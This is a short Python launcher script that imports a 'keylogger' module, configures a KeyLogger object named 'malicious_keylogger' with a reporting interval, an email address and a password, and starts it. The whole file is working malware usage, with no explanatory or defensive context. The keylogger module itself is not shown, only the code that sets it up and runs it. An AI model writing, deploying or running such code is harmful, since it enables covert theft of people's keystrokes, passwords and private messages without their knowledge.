#!/usr/bin/env python

import keylogger
# Initialize keylogger
malicious_keylogger = keylogger.KeyLogger(10, 'abc@gmail', '123456')
# Execute Keylogger
malicious_keylogger.start()
